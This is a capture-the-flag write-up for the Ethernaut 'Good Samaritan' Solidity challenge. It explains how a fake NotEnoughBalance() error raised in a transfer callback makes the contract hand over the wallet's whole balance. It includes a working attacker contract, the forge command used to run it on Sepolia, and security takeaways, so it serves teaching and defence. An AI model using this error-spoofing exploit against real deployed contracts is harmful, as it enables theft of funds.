# Ethernaut Challenge 27 — Good Samaritan

This challenge demonstrates how error handling and external contract callbacks can be abused to change the execution flow of a donation system.

The `GoodSamaritan` contract tries to donate `10` coins to anyone requesting them. If the donation fails with a very specific error, it assumes the wallet does not have enough balance left and transfers the entire remaining balance instead.

The goal is to exploit that logic and drain all the coins from the wallet.

Instance address:

```text
0x00381458550742927e355d61886aDA88650335b6
```

---

## 🎯 Goal

Drain the full balance from the `Wallet` contract.

---

## 🧠 Thought process

The key function is `requestDonation()`:

```solidity
function requestDonation() external returns (bool enoughBalance) {
    try wallet.donate10(msg.sender) {
        return true;
    } catch (bytes memory err) {
        if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```

At first glance, the intended logic is:

* donate `10` coins to the requester
* if the wallet truly does not have enough balance, send the remainder

The interesting part is that the fallback branch is triggered only if the revert data matches:

```solidity
abi.encodeWithSignature("NotEnoughBalance()")
```

So the challenge becomes:

> can we force `wallet.donate10(msg.sender)` to revert with `NotEnoughBalance()` even when the wallet still has plenty of coins?

The answer is yes.

---

## 🔍 Vulnerability summary

The `Wallet` sends coins through `Coin.transfer()`:

```solidity
function transfer(address dest_, uint256 amount_) external {
    uint256 currentBalance = balances[msg.sender];

    if (amount_ <= currentBalance) {
        balances[msg.sender] -= amount_;
        balances[dest_] += amount_;

        if (dest_.isContract()) {
            INotifyable(dest_).notify(amount_);
        }
    } else {
        revert InsufficientBalance(currentBalance, amount_);
    }
}
```

If the recipient is a contract, `Coin.transfer()` calls:

```solidity
INotifyable(dest_).notify(amount_);
```

This means that if the requester is a smart contract, that contract can run custom logic during the transfer.

So instead of calling `requestDonation()` from an EOA, we call it from an attacker contract implementing `INotifyable`.

Then the execution flow becomes:

```text
GoodSamaritan.requestDonation()
        ↓
Wallet.donate10(attacker)
        ↓
Coin.transfer(attacker, 10)
        ↓
attacker.notify(10)
```

If `notify(10)` reverts with the custom error `NotEnoughBalance()`, the revert bubbles up to `GoodSamaritan`, which then incorrectly assumes the wallet is almost empty and executes:

```solidity
wallet.transferRemainder(msg.sender);
```

That sends the full wallet balance to the attacker contract.

---

## ⚠️ Important subtlety

The attacker contract must not revert on every notification.

If it also reverts when `transferRemainder()` tries to send the full balance, the whole exploit fails.

So the contract should:

* revert only when `amount == 10`
* do nothing for the final full-balance transfer

---

## 🛠️ Attacker contract

To solve the challenge, I implemented the [Notifyable.sol](./Notifyable.sol) contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {INotifyable, GoodSamaritan} from "./GoodSamaritan.sol";

contract Notifyable is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan public goodSamaritan;

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure override {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
```

---

## ✅ Why this works

During `requestDonation()`:

1. `wallet.donate10(attacker)` tries to send `10`
2. `Coin.transfer()` detects that the recipient is a contract
3. it calls `notify(10)`
4. the attacker reverts with `NotEnoughBalance()`
5. `GoodSamaritan` catches that specific error
6. it calls `wallet.transferRemainder(attacker)`
7. the wallet now sends its full remaining balance
8. `notify(1000000)` is called, but this time the attacker does not revert
9. the transfer succeeds

So the contract tricks `GoodSamaritan` into taking the “send everything left” branch.

---

## 🚀 Solve on Sepolia

We executed the exploit using our automated Foundry script `script/27-GoodSamaritan.s.sol`. The script deploys `Notifyable` and executes `attack()`.

Execute it using:
```bash
forge script script/27-GoodSamaritan.s.sol:GoodSamaritanSolution --rpc-url sepolia --broadcast
```

### 📜 My Transactions

* **Notifyable Contract Deploy**: [0xaac36ad7027dd4a6c9de971f329a9a5d67f2ad4efbd41df8fbb615aa057b78c5](https://sepolia.etherscan.io/tx/0xaac36ad7027dd4a6c9de971f329a9a5d67f2ad4efbd41df8fbb615aa057b78c5)
* **Attack Execution**: [0x98f51d1bc800552973d095c8c0ba94b9175698f59fd1ecad57f79e59ee1212ed](https://sepolia.etherscan.io/tx/0x98f51d1bc800552973d095c8c0ba94b9175698f59fd1ecad57f79e59ee1212ed)
* **Exploit Block**: 10995988

---

## 🛡️ Security Takeaways
* **Validate error sources**: When using custom error names inside `try/catch` checks (e.g., matching revert signatures), verify that the error originated from the expected internal target rather than an arbitrary external call/callback.
* **Callback interactions**: External calls to user-supplied addresses (like transfer callbacks) delegate execution control. Ensure your contracts are prepared for custom state reverts or nested contract interactions during callbacks.
